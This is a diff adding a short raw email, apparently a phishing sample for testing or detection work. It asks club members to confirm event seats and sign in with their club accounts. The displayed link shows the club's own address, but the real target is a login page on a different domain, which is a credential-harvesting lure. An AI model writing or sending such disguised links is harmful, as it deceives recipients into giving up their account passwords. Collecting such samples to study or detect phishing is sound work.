@@ -1,0 +1,20 @@
+Return-Path: <sara@club-ruwad.example>
+Received: from mail.club-ruwad.example (mail.club-ruwad.example [198.51.100.10])
+        by mx.club-ruwad.example with ESMTPS id 3b77c; Wed, 18 Mar 2026 09:58:21 +0300
+Authentication-Results: mx.club-ruwad.example;
+        spf=pass smtp.mailfrom=club-ruwad.example;
+        dkim=pass header.d=club-ruwad.example;
+        dmarc=pass header.from=club-ruwad.example
+From: Sara <sara@club-ruwad.example>
+To: members@club-ruwad.example
+Subject: Register for Next Week’s Event — Confirm Your Seat
+Date: Wed, 18 Mar 2026 09:58:20 +0300
+X-Originating-IP: 203.0.113.77
+Content-Type: text/html; charset=UTF-8
+
+<html lang="en" dir="ltr"><body>
+<p>Hello everyone,</p>
+<p>Seats are limited. Confirm your attendance for next week’s event using the link, and sign in with your club account:</p>
+<p><a href="https://ufuq-unl.example/auth/login?ref=ZXZlbnQ=">https://club-ruwad.example/event-register</a></p>
+<p>Sara</p>
+</body></html>
